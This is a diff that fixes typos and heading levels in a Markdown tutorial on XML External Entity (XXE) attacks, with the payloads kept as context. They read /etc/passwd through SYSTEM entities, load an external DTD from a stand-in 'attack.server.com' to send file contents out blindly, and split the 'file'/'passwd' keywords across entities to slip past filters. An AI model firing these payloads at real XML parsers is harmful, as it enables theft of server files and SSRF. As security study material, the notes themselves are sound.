@@ -1,13 +1,13 @@
-Extenral XML Entities
+External XML Entities
 =====================
 
-# Overview
+## Overview
 
-## XML
+### XML
 
 Extensible Markup Language is a way of structuring data similar to JSON which has overtaken XML in popularity and largely replaced it in general.
 
-### XML Structure && Syntax
+#### XML Structure && Syntax
 
 ```
 <?xml version="1.0"?>
@@ -18,15 +18,15 @@ Extensible Markup Language is a way of structuring data similar to JSON which ha
 
 ```
 
-+ Tags are case sensitve
-+ "",'',<,> are illigal characters in XML due to the parser not knowing how to handel them
++ Tags are case sensitive
++ "",'',<,> are illegal characters in XML due to the parser not knowing how to handel them
 
-## Entities && The DTD
+### Entities && The DTD
 
-Entites operate like variables within the XML document where, once defined, they can be used anywhere throughout the document. XML entities live within a specific part of the XML document known as the DTD.
+Entities operate like variables within the XML document where, once defined, they can be used anywhere throughout the document. XML entities live within a specific part of the XML document known as the DTD.
 
 
-### Document Type Definition (DTD)
+#### Document Type Definition (DTD)
 
 ```
 <?xml version="1.0"?>
@@ -39,15 +39,15 @@ Entites operate like variables within the XML document where, once defined, they
 </Person>
 ```
 
-#### General Entities
+##### General Entities
 
 ```
-<!ENTITY generalEntity "arbitary">
+<!ENTITY generalEntity "arbitrary">
 
 <Usage>&generalEntity;</Usage>
 ```
 
-#### Parameter Entities
+##### Parameter Entities
 
 ```
 <!ENTITY % outer "<!ENTITY inner 'parameter'>">
@@ -57,7 +57,7 @@ Entites operate like variables within the XML document where, once defined, they
 + Only allowed inside the DTD
 + More flexiable and can allow the creation of an entity which contains another entity
 
-#### Predefined
+##### Predefined
 
 ```
 <specialChars>&#x3C;</specialChars>
@@ -65,20 +65,20 @@ Entites operate like variables within the XML document where, once defined, they
 
 + Collections of special characters that might break the document normally
 
-# XXE Types
+## XXE Types
 
-## Inband
+### Inband
 
 + XML document is parsed 
 + The XML parser reads the document
 + The output of the parser is rendered/output in a response
 
-## Error Based
+### Error Based
 
 + No output
 + A kind of blind XXE injection
 
-## Out of Band (OOB)
+### Out of Band (OOB)
 
 + Entirely blind
 + No output
@@ -88,9 +88,9 @@ Entites operate like variables within the XML document where, once defined, they
 + This also leads to SSRF (Server Side Request Forgery)
 
 
-# Attacks && Payloads
+## Attacks && Payloads
 
-## Read System Files
+### Read System Files
 
 ```
 <?xml version="1.0"?>
@@ -99,10 +99,10 @@ Entites operate like variables within the XML document where, once defined, they
 ]>
 <out>&payloadEntity;</out>
 ```
-+ Here the SYSTEM keyword reteives arbitary resources from a URI `/etc/passwd` to insert into the XML document
-+ In this way we can achive arbitary read 
++ Here the SYSTEM keyword retrieves arbitrary resources from a URI `/etc/passwd` to insert into the XML document
++ In this way we can achieve arbitrary read 
 
-### Include Entities Remotely
+#### Include Entities Remotely
 
 ```
 <?xml version="1.0"?>
@@ -112,7 +112,7 @@ Entites operate like variables within the XML document where, once defined, they
 <out>&payloadEntity;</out>
 ```
 
-## External DTD Payloads
+### External DTD Payloads
 
 + Because DTDs can be passed as a URI in a `SYSTEM` call they can be loaded externally by the XML parser
 
@@ -126,9 +126,9 @@ Entites operate like variables within the XML document where, once defined, they
 <payload>&secondary_entity;</payload>
 ```
 
-## Blind XXE Paylods Using External DTDs
+### Blind XXE Payloads Using External DTDs
 
-### Extenral DTD (external_payload.dtd)
+#### External DTD (external_payload.dtd)
 
 ```
 <!ENTITY % grabPasswd SYSTEM "file:///etc/passwd">
@@ -142,23 +142,23 @@ Entites operate like variables within the XML document where, once defined, they
 + When the document is parsed the wrapper entity will spawn the `send` entity as a general entity legally via the external DTD
 + This will then send the contents of `grabPasswd` to the attack server 
 
-### XXE Payload
+#### XXE Payload
 ```
 <?xml version="1.0"?>
 <!DOCTYPE payload SYSTEM "http://attack.server.com/external_payload.dtd">
 <payload>&send;</payload>
 ```
 
-## Filter Evasion
+### Filter Evasion
 
-### External DTD 
+#### External DTD 
 ```
 <!ENTITY % p1 "fi">
 <!ENTITY % p2 "le:///etc/pa">
 <!ENTITY % p3 "sswd">
 <!ENTITY % combined "<!ENTITY pwnFunc SYSTEM '%p1;%p2;%p3;'>">
 ```
-### Main XML
+#### Main XML
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -174,12 +174,12 @@ Entites operate like variables within the XML document where, once defined, they
 + This will attempt to bypass filters for keywords such as `file` and `passwd`
 + Extra layers can be added until the filter stops detecting trigger words
 
-## Exfiltration && Pitfalls
+### Exfiltration && Pitfalls
 
-+ Since some system files that an attacker may attempt to exfiltrate contain xml syntatic characters like `<,>` a work around must be implemented in order to read these files
++ Since some system files that an attacker may attempt to exfiltrate contain xml syntactic characters like `<,>` a work around must be implemented in order to read these files
 
 
-### CDATA
+#### CDATA
 
 + The character data syntax, `<![CDATA[ <text> ]]` is a way of telling the XML parser to ignore syntactic characters that may arise within this tag
 + Consider its usage in a external DTD payload bellow
